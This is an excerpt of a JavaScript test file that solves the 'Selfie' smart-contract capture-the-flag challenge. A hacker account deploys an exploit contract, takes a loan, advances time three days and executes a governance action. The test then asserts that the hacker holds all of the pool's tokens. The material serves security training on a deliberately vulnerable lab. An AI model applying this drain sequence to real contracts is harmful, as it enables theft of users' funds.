...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const SelfieExploit = await ethers.getContractFactory(
      "SelfieExploit",
      hacker
    );
    const selfieExploit = await SelfieExploit.deploy(
      token.address,
      governance.address,
      pool.address
    );

    await selfieExploit.getLoan();
    await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days
    await selfieExploit.execute();
  });
  ...
  after(async function () {
    ...
    expect(await token.balanceOf(hacker.address)).to.be.equal(TOKENS_IN_POOL);
